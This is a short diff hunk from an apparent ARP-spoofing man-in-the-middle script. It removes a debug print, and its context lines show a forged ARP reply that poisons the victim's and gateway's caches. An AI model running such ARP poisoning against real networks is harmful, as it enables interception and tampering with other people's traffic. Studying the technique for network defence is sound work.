@@ -42,7 +42,6 @@ def trick(gm, vm):
     send(ARP(op=2, psrc=victimIP, pdst=gatewayIP, hwdst=gm))
 
 def mitm():
-    print(get_mac(victimIP))
     try:
         victimMAC = get_mac(victimIP)
     except Exception:
